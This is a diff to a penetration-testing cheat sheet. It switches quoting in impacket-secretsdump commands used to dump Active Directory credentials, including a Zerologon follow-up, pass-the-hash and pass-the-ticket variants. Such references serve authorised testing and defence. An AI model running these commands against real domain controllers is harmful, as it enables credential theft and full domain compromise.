@@ -48,7 +48,7 @@ impacket-secretsdump  -ntds <ntds_file.dit> -system <SYSTEM_FILE> LOCAL
 zerologon
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
+impacket-secretsdump <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user 'Administrator'
 ```
 
 ## secretsdump - remote extract
@@ -66,18 +66,18 @@ impacket-secretsdump -just-dc -pwd-last-set -user-status -outputfile <ntlm-extra
 ## secretsdump - plaintext password
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump -dc-ip <DC_IP> "<DOMAIN>"/"<USER>":"<PASSWORD>"@"$<DC_HOST>"
+impacket-secretsdump -dc-ip <DC_IP> '<DOMAIN>'/'<USER>':'<PASSWORD>'@'$<DC_HOST>'
 ```
 
 ## secretsdump - Pass-the-Hash
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-impacket-secretsdump -hashes :"<HASH>" -dc-ip "<DC_IP>" "<DOMAIN>"/"<USER>"@"<DC_HOST>"
+impacket-secretsdump -hashes :'<HASH>' -dc-ip '<DC_IP>' '<DOMAIN>'/'<USER>'@'<DC_HOST>'
 ```
 
 ## secretsdump - with Pass-the-Ticket
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass -dc-ip "<DC_IP>" @"<DC_HOST>"
+KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass -dc-ip '<DC_IP>' @'<DC_HOST>'
 ```
 
